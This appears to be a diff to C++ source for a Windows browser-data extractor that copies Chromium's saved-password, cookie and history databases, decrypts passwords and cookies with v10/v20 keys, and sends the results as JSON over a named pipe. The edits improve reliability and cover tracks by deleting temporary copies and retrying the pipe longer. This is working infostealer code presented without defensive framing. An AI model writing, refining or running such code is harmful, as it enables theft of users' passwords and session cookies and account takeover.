@@ -135,9 +135,9 @@ std::vector<unsigned char> aes_gcm_decrypt(const std::vector<unsigned char>& key
 
 void extract_passwords(const fs::path& db_path, const std::vector<unsigned char>& v10, const std::vector<unsigned char>& v20, std::vector<PasswordData>& out) {
     if (!fs::exists(db_path)) return;
-    fs::path temp_path = fs::temp_directory_path() / "pass_db";
+    fs::path temp_path = fs::temp_directory_path() / (std::string("pass_db_") + std::to_string(GetTickCount()));
     try { fs::copy_file(db_path, temp_path, fs::copy_options::overwrite_existing); } catch (...) { return; }
-    sqlite3* db; if (sqlite3_open(temp_path.string().c_str(), &db) != SQLITE_OK) return;
+    sqlite3* db; if (sqlite3_open(temp_path.string().c_str(), &db) != SQLITE_OK) { fs::remove(temp_path); return; }
     const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
     sqlite3_stmt* stmt;
     if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
@@ -158,13 +158,14 @@ void extract_passwords(const fs::path& db_path, const std::vector<unsigned char>
         sqlite3_finalize(stmt);
     }
     sqlite3_close(db);
+    fs::remove(temp_path);
 }
 
 void extract_cookies(const fs::path& db_path, const std::vector<unsigned char>& v10, const std::vector<unsigned char>& v20, std::vector<CookieData>& out) {
     if (!fs::exists(db_path)) return;
-    fs::path temp_path = fs::temp_directory_path() / "cook_db";
+    fs::path temp_path = fs::temp_directory_path() / (std::string("cook_db_") + std::to_string(GetTickCount()));
     try { fs::copy_file(db_path, temp_path, fs::copy_options::overwrite_existing); } catch (...) { return; }
-    sqlite3* db; if (sqlite3_open(temp_path.string().c_str(), &db) != SQLITE_OK) return;
+    sqlite3* db; if (sqlite3_open(temp_path.string().c_str(), &db) != SQLITE_OK) { fs::remove(temp_path); return; }
     const char* sql = "SELECT host_key, name, encrypted_value FROM cookies";
     sqlite3_stmt* stmt;
     if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
@@ -187,13 +188,14 @@ void extract_cookies(const fs::path& db_path, const std::vector<unsigned char>& 
         sqlite3_finalize(stmt);
     }
     sqlite3_close(db);
+    fs::remove(temp_path);
 }
 
 void extract_history(const fs::path& db_path, std::vector<HistoryData>& out) {
     if (!fs::exists(db_path)) return;
-    fs::path temp_path = fs::temp_directory_path() / "hist_db";
+    fs::path temp_path = fs::temp_directory_path() / (std::string("hist_db_") + std::to_string(GetTickCount()));
     try { fs::copy_file(db_path, temp_path, fs::copy_options::overwrite_existing); } catch (...) { return; }
-    sqlite3* db; if (sqlite3_open(temp_path.string().c_str(), &db) != SQLITE_OK) return;
+    sqlite3* db; if (sqlite3_open(temp_path.string().c_str(), &db) != SQLITE_OK) { fs::remove(temp_path); return; }
     const char* sql = "SELECT url, title, visit_count FROM urls LIMIT 500";
     sqlite3_stmt* stmt;
     if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
@@ -207,6 +209,7 @@ void extract_history(const fs::path& db_path, std::vector<HistoryData>& out) {
         sqlite3_finalize(stmt);
     }
     sqlite3_close(db);
+    fs::remove(temp_path);
 }
 
 void do_work() {
@@ -247,10 +250,10 @@ void do_work() {
     }
     const wchar_t* pipe_name = L"\\\\.\\pipe\\chrome_extractor";
     HANDLE h_pipe = INVALID_HANDLE_VALUE;
-    for (int i = 0; i < 30; i++) {
+    for (int i = 0; i < 60; i++) {
         h_pipe = CreateFileW(pipe_name, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
         if (h_pipe != INVALID_HANDLE_VALUE) break;
-        Sleep(200);
+        Sleep(500);
     }
     if (h_pipe != INVALID_HANDLE_VALUE) {
         std::string s = collected.dump(); DWORD written;
